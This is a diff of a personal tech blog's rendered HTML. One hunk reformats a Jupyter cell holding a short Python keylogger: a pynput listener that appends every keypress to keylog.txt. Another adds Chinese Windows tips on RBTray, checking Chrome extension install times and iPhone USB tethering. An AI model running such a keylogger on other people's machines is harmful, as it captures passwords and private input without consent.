@@ -164,45 +164,38 @@ English中文The EMOTET group managed to take email as an attack vector to a nex
 <div class="text_cell_render border-box-sizing rendered_html">
 <div class="highlight"><pre><span></span>python<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>pynput
 </pre></div>
-
 </div>
 </div>
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">In&nbsp;[1]:</div>
+<div class="prompt input_prompt">In [1]:</div>
 <div class="inner_cell">
-    <div class="input_area">
-<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">pynput</span> <span class="kn">import</span> <span class="n">keyboard</span>
+<div class="input_area">
+<div class="highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">pynput</span> <span class="kn">import</span> <span class="n">keyboard</span>
 </pre></div>
-
-    </div>
 </div>
 </div>
-
+</div>
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">In&nbsp;[2]:</div>
+<div class="prompt input_prompt">In [2]:</div>
 <div class="inner_cell">
-    <div class="input_area">
-<div class=" highlight hl-ipython3"><pre><span></span><span class="n">log_file</span> <span class="o">=</span> <span class="s1">&#39;keylog.txt&#39;</span>
+<div class="input_area">
+<div class="highlight hl-ipython3"><pre><span></span><span class="n">log_file</span> <span class="o">=</span> <span class="s1">'keylog.txt'</span>
 
 <span class="k">def</span> <span class="nf">on_press</span><span class="p">(</span><span class="n">key</span><span class="p">:</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">Key</span> <span class="o">|</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">KeyCode</span> <span class="o">|</span> <span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
-    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">log_file</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s1">]&#39;</span><span class="p">)</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">log_file</span><span class="p">,</span> <span class="s1">'a'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s1">'[</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s1">]'</span><span class="p">)</span>
 
 <span class="k">with</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">Listener</span><span class="p">(</span><span class="n">on_press</span><span class="o">=</span><span class="n">on_press</span><span class="p">)</span> <span class="k">as</span> <span class="n">listener</span><span class="p">:</span>
     <span class="n">listener</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
 </pre></div>
-
-    </div>
 </div>
 </div>
-
 </div>
- 
-
+</div>
 
 
 
@@ -532,6 +525,29 @@ English中文The EMOTET group managed to take email as an attack vector to a nex
 </ul>
 </li>
 </ol>
+<h2 id="让-Chromium-使用系统托盘运行（第三方工具）"><a href="#让-Chromium-使用系统托盘运行（第三方工具）" class="headerlink" title="让 Chromium 使用系统托盘运行（第三方工具）"></a>让 Chromium 使用系统托盘运行（第三方工具）</h2><p>Windows 本身不支持直接将 <a target="_blank" rel="noopener" href="https://www.chromium.org/getting-involved/download-chromium/#not-as-easy-steps">Chromium</a> 或者 <a target="_blank" rel="noopener" href="https://vivaldi.com/">Vivaldi</a> 移动到托盘（右下角通知区域）。但可以使用第三方工具，如 <strong>RBTray</strong> 或 <strong>TrayIt</strong>!，将 Chromium 最小化到系统托盘中：</p>
+<ol>
+<li>下载并运行 <a target="_blank" rel="noopener" href="https://rbtray.sourceforge.net/">RBTray</a>（无需安装）。</li>
+<li>打开 Chromium 后，用右键单击窗口右上角的最小化按钮。</li>
+<li>Chromium 图标将最小化到托盘。</li>
+</ol>
+<p>查看 Microsoft Purview 扩展 和 Microsoft Single Sign-On (SSO) 插件在 Chrome 浏览器中何时部署：</p>
+<ol>
+<li>打开以下目录：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions</span><br></pre></td></tr></table></figure></li>
+<li>找到扩展的文件夹（通过扩展程序 ID）。<ul>
+<li>你可以在 <code>chrome://extensions/</code> 页面中找到扩展 ID。</li>
+</ul>
+</li>
+<li>右键扩展文件夹，选择 <strong>属性</strong>。</li>
+<li>在 <strong>创建时间</strong> 中查看扩展的初始安装时间。</li>
+</ol>
+<p>让 iPhone 通过 USB 分享网络给 Windows 11：</p>
+<ul>
+<li>安装 <a target="_blank" rel="noopener" href="https://github.com/koush/AppleMobileDeviceSupport/releases/tag/v14.5.0.7"><strong>AppleMobileDeviceSupport</strong></a> 。</li>
+<li>打开 <strong>控制面板</strong> → <strong>网络和共享中心</strong> → <strong>更改适配器设置</strong>。</li>
+<li>你应该能够看到 <strong>Apple Mobile Device Ethernet</strong> 或类似名称的适配器，这表示 iPhone 正在通过 USB 共享网络。</li>
+<li>如果看到该适配器，右键点击它并选择 <strong>启用</strong>。</li>
+</ul>
 
 	</div>
 
@@ -604,7 +620,7 @@ English中文The EMOTET group managed to take email as an attack vector to a nex
   </div>
   <div class="container-narrow">
   <footer> <p>
-  &copy; 2024 Andrew
+  &copy; 2025 Andrew
   
       with help from <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a>. Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>.    
 </p> </footer>
